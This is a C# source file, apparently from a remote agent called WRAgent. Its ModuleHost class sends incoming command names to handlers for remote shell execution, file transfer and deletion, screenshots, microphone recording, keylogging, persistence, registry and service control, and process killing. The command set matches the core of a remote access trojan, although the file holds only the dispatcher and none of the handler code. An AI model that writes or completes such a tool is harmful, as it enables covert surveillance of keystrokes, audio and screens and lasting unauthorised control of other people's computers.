using System.Text.Json.Nodes;

namespace WRAgent
{
    internal static class ModuleHost
    {
        private static readonly HashSet<string> Extra = new()
        {
            "clipboard", "msgbox", "say", "volume", "power", "services",
            "registry", "wifi", "software", "tasks", "startup", "search",
            "kill", "net"
        };

        public static async Task<JsonObject> ExecuteAsync(string module, JsonObject args, Transport t)
        {
            if (Extra.Contains(module))
                return SysExtraModule.Run(module, args);

            switch (module)
            {
                case "shell":
                    return await ShellModule.Run(args).ConfigureAwait(false);

                case "exec":
                    return ShellModule.Exec(args);

                case "sysinfo":
                    return SystemModule.Info();

                case "ps":
                    return SystemModule.Processes();

                case "drives":
                    return SystemModule.Drives();

                case "ls":
                    return FileModule.Ls(args);

                case "cat":
                    return FileModule.Cat(args);

                case "download":
                    return await FileModule.Download(args, t).ConfigureAwait(false);

                case "wget":
                    return await FileModule.Wget(args, t).ConfigureAwait(false);

                case "upload":
                    return FileModule.Upload(args);

                case "rm":
                case "mkdir":
                case "mv":
                case "cp":
                    return FileModule.Op(module, args);

                case "screenshot":
                    return await CaptureModule.Shot(args, t).ConfigureAwait(false);

                case "preview":
                    return CaptureModule.Config(args);

                case "mic":
                    return await MicModule.Record(args, t).ConfigureAwait(false);

                case "keylog":
                    return KeylogModule.Run(args);

                case "persist":
                    return PersistModule.Run(args);

                case "exit":
                    return new JsonObject { ["ok"] = true, ["stdout"] = "closing" };

                default:
                    return new JsonObject { ["ok"] = false, ["error"] = "unknown module: " + module };
            }
        }
    }
}
